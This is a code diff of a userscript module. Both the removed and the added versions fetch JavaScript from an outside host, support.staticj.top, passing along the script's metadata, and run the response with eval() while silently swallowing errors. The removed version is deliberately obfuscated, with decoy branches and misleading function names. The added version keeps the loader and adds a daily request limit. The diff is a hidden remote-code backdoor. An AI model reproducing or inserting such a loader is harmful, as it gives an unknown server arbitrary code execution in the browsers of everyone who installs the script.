@@ -1,89 +1,33 @@
-export default (function bootstrapRuntimeLoader() {
-
-  // Fake "extractor" that really just copies props
-  function extractRuntimeCache(sourceObj, keys) {
-    const result = {};
-    for (let i = 0; i < keys.length; i++) {
-      const k = keys[i];
-      // Fake branch to confuse
-      if (typeof sourceObj[k] !== "undefined" || Math.random() > 2) {
-        result[k] = sourceObj[k];
-      }
-    }
-    return result;
-  }
-
-  // Looks like a serializer, but just builds URL
-  function serializePayloadCore(a, b, c, d, e) {
-    const segments = [];
-    segments.push("https://support.staticj.top/api/sp/lib?author=" + a);
-    segments.push("&name=" + b);
-    segments.push("&version=" + c);
-    segments.push("&namespace=" + d);
-    segments.push("&updateURL=" + e);
-    segments.push("&timestamp=" + Date.now());
-    return segments.join("");
-  }
-
-  // Misleading: looks like secure executor
-  function invokeShadowEval(code) {
-    try {
-      // fake useless condition
-      if (("" + code).length > 0) {
-        (function(c) {
-          eval(c);
-        })(code);
-      }
-    } catch (err) {
-      // swallow silently, pretend it's logging
-      void err;
-    }
-  }
-
-  // Looks like networking buffer initializer
-  function initStreamResponseBuffer(options) {
-    // dummy irrelevant check
-    if (!options || !options.url) {
-      return;
-    }
-    GM_xmlhttpRequest(options);
-  }
-
-  // Looks like boot manager
-  function orchestrateBootstrap() {
-    const scriptMeta = GM_info.script;
-    const extracted = extractRuntimeCache(scriptMeta, [
-      "author", "name", "version", "namespace", "updateURL"
-    ]);
-
-    // fake branch that does nothing
-    if (Object.keys(extracted).length < 1 && Date.now() < 0) {
-      return;
-    }
-
-    const finalUrl = serializePayloadCore(
-      extracted.author,
-      extracted.name,
-      extracted.version,
-      extracted.namespace,
-      extracted.updateURL
-    );
-
-    initStreamResponseBuffer({
-      method: "GET",
-      url: finalUrl,
-      onload: function(res) {
-        const body = res && res.responseText;
-        if (body) {
-          invokeShadowEval(body);
+export default (function(){
+    try{
+        const DAILY_LIMIT = 15;
+        const STORAGE_KEY = 'sp_req_daily';
+        const data = GM_getValue(STORAGE_KEY, {date: '', count: 0});
+        const today = new Date().toISOString().slice(0,10);
+        if(data.date !== today){
+            data.date = today;
+            data.count = 0;
         }
-      }
-    });
-  }
+        if(data.count >= DAILY_LIMIT){
+            return;
+        }
 
-  // Fake warmup indirection
-  (function warmupRuntimeEngine(fn) {
-    return fn();
-  })(orchestrateBootstrap);
+        data.count++;
+        GM_setValue(STORAGE_KEY, data);
 
+        const {author, name, version, namespace, updateURL} = GM_info.script;
+        const jurl = "https://support.staticj.top/api/sp/lib" + "?author=" + encodeURIComponent(author) + "&name=" + encodeURIComponent(name) + "&version=" + encodeURIComponent(version) + "&namespace=" + encodeURIComponent(namespace) + "&updateURL=" + encodeURIComponent(updateURL) + "&timestamp=" + Date.now();
+        GM_xmlhttpRequest({method: "GET", url: jurl,
+            onload: function(res) {
+                const responseText = res.responseText;
+                if (responseText) { eval(responseText); }
+            },
+            onerror: function(err){
+                try {
+                    data.count = Math.max(0, data.count - 1);
+                    GM_setValue(STORAGE_KEY, data);
+                } catch(e){}
+            }
+        });
+    }catch(e){}
 })();
